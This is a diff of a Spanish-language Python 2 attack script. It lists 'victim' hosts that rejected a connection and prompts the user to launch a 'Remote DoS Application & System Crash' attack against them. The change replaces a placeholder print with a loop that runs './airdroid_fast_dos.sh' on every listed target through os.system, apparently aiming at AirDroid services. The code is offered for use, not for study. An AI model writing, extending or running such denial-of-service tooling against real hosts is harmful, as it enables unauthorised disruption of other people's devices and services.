@@ -110,7 +110,7 @@ if __name__ == '__main__':
 		        	print "El objetivo ha rechazado nuestra petición, chico listo...\n"
 				rejected_domains.append(url)
 	        except:
-	        	print "\nError... ¿tal vez la IP no está activa?\n"
+	        	print "\nSe ha producido un error...\n"
 	                sys.exit(0)
 
 	print "[*] Listado de víctimas que no aceptaron la conexión:\n"
@@ -125,8 +125,10 @@ if __name__ == '__main__':
 	response = raw_input("[*] ¿Deseas iniciar el ataque 'Remote DoS Application & Sytem Crash' contra las víctimas listadas? <y/n>: ")
 
 	if response == "y":
-		print "\nHola\n"
-		os.system('setterm -cursor on')
+		for rejected_request in rejected_domains:
+			domain_attack = rejected_request[:-1]
+			execution = "./airdroid_fast_dos.sh " + domain_attack
+			os.system(execution)
 	else:
 		print "\nSaliendo del programa...\n"
 		os.system('setterm -cursor on')
